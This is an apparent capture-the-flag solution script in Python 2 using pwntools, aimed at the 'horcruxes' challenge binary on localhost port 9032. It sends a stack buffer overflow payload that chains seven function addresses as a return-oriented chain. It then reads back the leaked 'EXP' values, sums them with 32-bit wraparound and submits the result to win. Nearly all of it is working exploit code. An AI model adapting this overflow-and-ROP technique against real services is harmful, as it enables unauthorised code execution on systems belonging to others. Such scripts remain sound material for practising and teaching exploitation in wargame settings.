#!/usr/bin/env python2
from pwn import *

ready = True
if ready:
    conn = remote('localhost', 9032)
else:
    conn = process(['/home/doublesine/Desktop/horcruxes'])

func_A_addr = 0x0809FE4B
func_B_addr = 0x0809FE6A
func_C_addr = 0x0809FE89
func_D_addr = 0x0809FEA8
func_E_addr = 0x0809FEC7
func_F_addr = 0x0809FEE6
func_G_addr = 0x0809FF05

def SendLine(s):
    sleep(0.5)
    print(s)
    conn.sendline(s)

def ExtraExp(s):
    keyword = 'EXP +'
    start = s.find(keyword) + len(keyword)
    end = s.find(')', start)
    return int(s[start:end])

sleep(0.5)
print conn.read(),
SendLine('1')
print conn.read(),
SendLine('0' * 0x74 + '\x00aaa' + pack(func_A_addr, 32) +
                                  pack(func_B_addr, 32) + 
                                  pack(func_C_addr, 32) + 
                                  pack(func_D_addr, 32) + 
                                  pack(func_E_addr, 32) + 
                                  pack(func_F_addr, 32) + 
                                  pack(func_G_addr, 32) + 
                                  pack(0x0809FFFC, 32))
print conn.readline(),
A = conn.readline()
B = conn.readline()
C = conn.readline()
D = conn.readline()
E = conn.readline()
F = conn.readline()
G = conn.readline()
print A, B, C, D, E, F, G
A = ExtraExp(A)
B = ExtraExp(B)
C = ExtraExp(C)
D = ExtraExp(D)
E = ExtraExp(E)
F = ExtraExp(F)
G = ExtraExp(G)
Sum = (A + B + C + D + E + F + G) % 2 ** 32
if Sum > 0x7fffffff:
    Sum -= 2 ** 32
if Sum < 0x80000000 - 2 **32:
    Sum += 2 ** 32

print conn.read(),
SendLine('1')
print conn.read(),
SendLine(str(Sum))
print conn.read()
conn.close()
